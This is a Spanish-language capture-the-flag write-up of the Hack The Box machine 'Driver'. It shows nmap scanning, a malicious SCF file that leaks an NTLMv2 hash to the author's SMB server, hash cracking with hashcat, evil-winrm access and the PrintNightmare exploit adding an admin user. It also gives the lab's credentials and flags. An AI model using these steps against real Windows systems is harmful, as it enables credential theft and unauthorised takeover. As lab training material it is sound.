---
tags:
  - estado/completo
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/387
dificultad: Fácil
os: Windows
linked:
  - "[[evil-winrm]]"
  - "[[crackmapexec]]"
  - "[[SCF Malicious File]]"
  - "[[SMB Authentication Leak]]"
  - "[[NTLMv2]]"
  - "[[Cracking Hashes]]"
  - "[[Print Spooler Local Privilege Escalation (PrintNightmare) [CVE-2021-1675]]]"
---
#  HackTheBox - Driver

## Reconocimiento

### Nmap
#### Escaneo Inicial de Puertos (TCP SYN Scan)

Comencé con un escaneo completo de puertos TCP para identificar qué servicios estaban activos en la IP `10.10.11.106`. Utilicé `nmap` con los siguientes parámetros para una exploración rápida y eficiente:
```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.106 -oG logs/allPorts
```

|   |   |
|---|---|
|**Parámetro**|**Descripción**|
|`-p-`|Escanea todos los puertos (1-65535).|
|`-sS`|Realiza un escaneo SYN "Stealth" (sigiloso).|
|`--min-rate 5000`|Envía paquetes a una velocidad mínima de 5000 por segundo, acelerando el escaneo.|
|`--open`|Muestra solo los puertos que se encontraron abiertos.|
|`-vvv`|Aumenta el nivel de verbosidad para ver más detalles en la consola.|
|`-n`|Evita la resolución DNS.|
|`-Pn`|Trata a todos los hosts como si estuvieran en línea, saltándose la fase de descubrimiento de hosts.|
|`-oG allPorts`|Guarda la salida en formato "grepeable" en el archivo `allPorts`, útil para procesar con scripts.|

El escaneo reveló los siguientes puertos abiertos:

|   |   |   |
|---|---|---|
|**Puerto**|**Servicio**|**Descripción**|
|**80/tcp**|`http`|Servidor Web (HTTP)|
|**135/tcp**|`msrpc`|Servicios MSRPC (Microsoft Remote Procedure Call)|
|**445/tcp**|`microsoft-ds`|SMB (Server Message Block)|
|**5985/tcp**|`wsman`|WinRM (Windows Remote Management)|

#### Escaneo Detallado de Servicios y Versiones

Una vez identificados los puertos principales, realicé un escaneo más específico para obtener información sobre las versiones de los servicios y ejecutar scripts predeterminados de Nmap (`-sC`).
```Bash
nmap -sCV -p 80,135,445,5985 10.10.11.106 -oN logs/nmap-sCV
```

|   |   |
|---|---|
|**Parámetro**|**Descripción**|
|`-sC`|Ejecuta scripts por defecto de Nmap, útiles para la enumeración de vulnerabilidades y configuraciones comunes.|
|`-sV`|Intenta determinar la versión de los servicios que se ejecutan en los puertos abiertos.|
|`-p <ports>`|Especifica los puertos a escanear.|
|`-oN targeted`|Guarda la salida en formato normal en el archivo `targeted`.|

Los resultados de este escaneo proporcionaron detalles clave:

- **Puerto 80 (HTTP):** Se identificó un servidor **Microsoft IIS httpd 10.0**. La página principal (`http://10.10.11.106/`) mostró un código `401 Unauthorized` con un _realm_ `MFP Firmware Update Center. Please enter password for admin`, lo que sugiere una interfaz de administración. También se observó que la página estaba impulsada por **PHP 7.3.25**.
- **Puerto 445 (SMB):** Se confirmó que el servicio SMB se ejecutaba en un sistema **Microsoft Windows 7 - 10**. El escaneo de scripts de SMB (`smb-security-mode` y `smb2-security-mode`) indicó que el modo de seguridad era `user` y que el firmado de mensajes SMB estaba deshabilitado (lo cual es peligroso, aunque a menudo es el valor por defecto).
- **Puerto 5985 (WinRM):** El puerto WinRM también estaba abierto, ejecutando **Microsoft HTTPAPI httpd 2.0**.

### Análisis de la Aplicación Web con Whatweb

Para obtener una visión general de las tecnologías web utilizadas en el puerto 80, empleé `whatweb`:
```Bash
whatweb http://10.10.11.106/

http://10.10.11.106/ [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.106], Microsoft-IIS[10.0], PHP[7.3.25], WWW-Authenticate[MFP Firmware Update Center. Please enter password for admin][Basic], X-Powered-By[PHP/7.3.25]
```

La herramienta confirmó la presencia de **Microsoft-IIS/10.0** y **PHP/7.3.25**, y reiteró la necesidad de autenticación "Basic" para el "MFP Firmware Update Center".

### Configuración del Virtual Host

Dado que se trata de una máquina de Hack The Box, es una buena práctica añadir el nombre de host al archivo `/etc/hosts` para facilitar la navegación y el manejo de solicitudes si la aplicación web dependiera de un virtual host.
```Bash
echo '10.10.11.106 driver.htb' | sudo tee -a /etc/hosts
```


---

## Explotación de Vulnerabilidades

### Acceso al Panel de Administración

Al visitar la página web, me encontré con un formulario de login que solicitaba credenciales. Dada la naturaleza de las CTF, una de las primeras pruebas que realizo es la combinación `admin:admin`. Sorprendentemente, ¡esta combinación de usuario y contraseña funcionó!

Una vez dentro, el único menú funcional era "Firmware Updates". Al acceder a esta sección, se presentó una funcionalidad para subir nuevos _firmware_ para la impresora.

### Captura de Hash NTLMv2 mediante SCF

Sabiendo que el servidor tenía SMB habilitado (puerto 445), identifiqué una posible vía de ataque utilizando un archivo SCF (Shell Command File). Un archivo SCF, cuando es accedido en un recurso compartido de red por un sistema Windows, puede forzar una autenticación hacia una dirección SMB externa. Esto permite capturar el hash NTLMv2 del usuario que interactúa con el archivo.

Creé un archivo `hash.scf` con el siguiente contenido:
```Bash
vi @hash.scf

[shell]
Command=2
IconFile=\\<MI-IP>\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

>[!note] Nota
El símbolo `@` al inicio del nombre de archivo (`@gethash.scf`) es una técnica que a veces se usa en Windows para que el archivo aparezca en la parte superior de la lista en una carpeta compartida, facilitando que el usuario lo vea y, por ende, interactúe con él.

Posteriormente, configuré un servidor SMB en mi máquina atacante (`<MI-IP>`) utilizando `impacket-smbserver` para interceptar la conexión:
```Bash
sudo impacket-smbserver -debug -smb2support share $(pwd)
```

>[!IMPORTANT] Importante
> En este caso no hace falta usar responder para ver el hash, responder es para envenenamiento y directorio activo. 

Finalmente, subí el archivo `@hash.scf` a la web. Al hacerlo, el servidor de la máquina víctima (`10.10.11.106`) intentó cargar el ícono especificado en el SCF desde mi servidor SMB, lo que resultó en la captura del hash NTLMv2 del usuario `tony`:

```
[*] User DRIVER\tony authenticated successfully
[*] tony::DRIVER:aaaaaaaaaaaaaaaa:9991db804510f48964a41ea7deb9f4e9:0101000000000000002605df4b2ad801e44969567acd523200000000010010004800700049006f006700490055006600030010004800700049006f0067004900550066000200100075006c00500070004f004a00730041000400100075006c00500070004f004a007300410007000800002605df4b2ad80106000400020000000800300030000000000000000000000000200000539a457fb58fa01a9211ce1bc906e7ae99c28bdb93afbca3f53a76a6ca6e05a50a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e0032003500000000000000000000000000
```

### Crackeo del Hash NTLMv2

Guardé el hash en un archivo (`hash`) y verifiqué su formato con `hashid`:
```Bash
hashid hash
--File 'hash'--
Analyzing 'tony::DRIVER:aaaaaaaaaaaaaaaa:9991db804510f48964a41ea7deb9f4e9:...'
[+] NetNTLMv2
```

La herramienta lo reconoció correctamente como un hash **NetNTLMv2**. Para crackearlo, usé `hashcat` con el modo `5600` (NetNTLMv2) y la popular _wordlist_ `rockyou.txt`:
```Bash
hashcat -a 0 -m 5600 tony.hash /usr/share/wordlists/rockyou.txt
```

En cuestión de segundos, `hashcat` logró descifrar la contraseña: **`liltony`**.

### Acceso al Sistema mediante WinRM

Con las credenciales `tony:liltony` en mano, el siguiente paso lógico era intentar acceder al sistema. Dado que el puerto 5985 (WinRM) estaba abierto, `evil-winrm` era la herramienta perfecta para la tarea:
```Bash
evil-winrm -i 10.10.11.106 -u tony -p 'liltony'
```

¡Éxito! Logré una sesión de WinRM como el usuario `tony`. Lo primero que hice fue buscar el archivo `user.txt`, que en las máquinas de Windows de Hack The Box suele encontrarse en el escritorio del usuario o en su carpeta personal.
```PowerShell
*Evil-WinRM* PS C:\Users\tony\Documents> type ..\Desktop\user.txt
5a4469b085a21610e27b8d65f1358449
```


---

## Escalada de Privilegios

### Enumeración con WinPEAS

Para identificar posibles vectores de escalada, utilicé `winPEAS`, una herramienta de enumeración de privilegios para Windows.

1. **Descargar WinPEAS:** Descargué la versión `x64` de `winPEAS` desde su repositorio de GitHub a mi máquina local:
    ```Bash
	wget https://github.com/carlospolop/PEASS-ng/releases/download/20220220/winPEASx64.exe
    ```
    
2. **Preparar Directorio en la Víctima:** Dentro de la sesión de WinRM, creé un directorio temporal en `C:\Windows\Temp` para almacenar `winPEAS`:
    ```PowerShell
    *Evil-WinRM* PS C:\Users\tony\Documents> cd C:\Windows\Temp
    *Evil-WinRM* PS C:\Windows\Temp> mkdir share
    *Evil-WinRM* PS C:\Windows\Temp> cd share
    ```
    
3. **Transferir WinPEAS a la Víctima:** utilice directamente `evil-winrm` para descargar `winPEASx64.exe`:
    ```PowerShell
    *Evil-WinRM* PS C:\Windows\Temp\share> upload <ubicacion en mi maquina>
    ```
>[!tip]
> evil-winrm me permite subir y descargar archivos con facilidad, simplemente poniendo `upload` o `download` y la tecla tab luego de las primeras letras del archivo.

4. **Habilitar Colores en la Consola (Opcional):** Para una mejor visualización de la salida de `winPEAS` con colores, ajusté la clave de registro `VirtualTerminalLevel`:
    ```PowerShell
    *Evil-WinRM* PS C:\Windows\Temp\share> REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
    ```
    
5. **Ejecutar WinPEAS:** Finalmente, ejecuté `winPEAS` en la máquina víctima:
    ```PowerShell
    *Evil-WinRM* PS C:\Windows\Temp\share> C:\Windows\Temp\share\winpeas.exe
    ```
    

### Vulnerabilidad PrintNightmare (CVE-2021-1675)

La salida de `winPEAS` es extensa, pero un hallazgo significativo fue la mención del servicio `spoolsv` (Print Spooler). Al investigar sobre este servicio, rápidamente se destaca la vulnerabilidad conocida como **PrintNightmare**.

Específicamente, el `CVE-2021-1675` permite la ejecución remota de código (RCE) con privilegios de sistema debido a una debilidad en el servicio Print Spooler. Una búsqueda rápida en GitHub reveló varios _exploits_ para esta vulnerabilidad, incluyendo un script de PowerShell que permite añadir un nuevo usuario con privilegios de administrador.
[GitHub - JohnHammond/CVE-2021-34527](https://github.com/JohnHammond/CVE-2021-34527)

1. **Clonar el Exploit:** Cloné el repositorio de `calebstewart/CVE-2021-1675` a mi máquina local:
    ```Bash
    git clone https://github.com/calebstewart/CVE-2021-1675
    ```
    
2. **Transferir el Script a la Víctima:** De manera similar a como transferí `winPEAS`, descargo `CVE-2021-1675.ps1` 
    ```PowerShell
    *Evil-WinRM* PS upload <Directorio en mi PC>\CVE-2021-1675.ps1
    ```
    
3. **Ajustar la Política de Ejecución de PowerShell:** Antes de importar el script, verifiqué la política de ejecución de PowerShell, que por defecto suele estar en `Restricted`:
    ```PowerShell
    *Evil-WinRM* PS C:\Windows\Temp\share> Get-ExecutionPolicy
    Restricted
    ```
    
    Para poder ejecutar scripts, cambié la política para el usuario actual a `Unrestricted`:
    ```PowerShell
    *Evil-WinRM* PS C:\Windows\Temp\share> Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force;
    *Evil-WinRM* PS C:\Windows\Temp\share> Get-ExecutionPolicy
    Unrestricted
    ```
    
4. **Ejecutar el Exploit PrintNightmare:** Con la política de ejecución ajustada, importé el script como un módulo de PowerShell y ejecuté la función `Invoke-Nightmare` para crear un nuevo usuario (`v`) con una contraseña (`pwned`):    
    ```PowerShell
    *Evil-WinRM* PS C:\Windows\Temp\share> Import-Module ./pn.ps1
    *Evil-WinRM* PS C:\Windows\Temp\share> Invoke-Nightmare -NewUser "v" -NewPassword "pwned"
    ```
    
    La salida confirmó que el usuario `v` fue añadido como administrador local:
    ```
    [+] created payload at C:\Users\tony\AppData\Local\Temp\v.dll
    [+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
    [+] added user v as local administrator
    [+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
    ```
    

### Obtención de la Flag Root

Finalmente, con las credenciales del nuevo usuario `v` (que tiene privilegios de administrador), inicié una nueva sesión de WinRM:
```Bash
evil-winrm -i 10.10.11.106 -u v -p 'pwned'
```

Dentro de la sesión, navegué al escritorio del `Administrator` y a la flag `root.txt`:
```PowerShell
*Evil-WinRM* PS C:\Users\v\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
dc413510b078b501b04e7d672d0739cd
```


---

## Bandera(s)

> [!flag] `flag{user}`
> 5a4469b085a21610e27b8d65f1358449
^bandera-user

> [!flag] `flag{root}`
>dc413510b078b501b04e7d672d0739cd
^bandera-root


